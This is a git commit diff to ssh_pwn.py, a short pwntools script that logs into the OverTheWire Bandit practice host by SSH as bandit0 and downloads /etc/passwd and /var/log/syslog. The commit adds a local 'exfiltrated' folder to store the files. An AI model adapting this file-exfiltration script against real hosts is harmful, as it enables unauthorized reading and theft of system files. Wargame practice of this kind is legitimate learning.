16b88e0d358d2454f4e6b13577e20eeb4df2dd8f
SapereAude86 <sdehaan86@protonmail.com>
2018-08-19 16:51:03 +0200

    Added directory creation for the exfiltrated datta

--- ssh_pwn.py
+++ ssh_pwn.py
@@ -1,4 +1,5 @@
 from pwn import *
+import os
 
 username = "bandit0"
 host = "bandit.labs.overthewire.org"
@@ -7,7 +8,7 @@ port = 2220
 
 shell = ssh(username, host, password=password, port=port)
 exfil_files = ['/etc/passwd', '/var/log/syslog', ]
-
+directory = 'exfiltrated'
 
 def download_data(shell):
     print "Exfiltrating : " + shell.distro[0] + shell.distro[1] + " with user: " + str(shell['whoami'])
@@ -15,7 +16,9 @@ def download_data(shell):
         print exfil_file
         to_dl = shell.download_data(exfil_file)
         if to_dl:
-            with open(exfil_file.split("/")[-1]+".txt", "w") as exfils:
+            if not os.path.exists(directory):
+                os.makedirs(directory)
+            with open(directory + "/" + exfil_file.split("/")[-1]+".txt", "w") as exfils:
                     exfils.write(to_dl)
 
 if shell.connected():
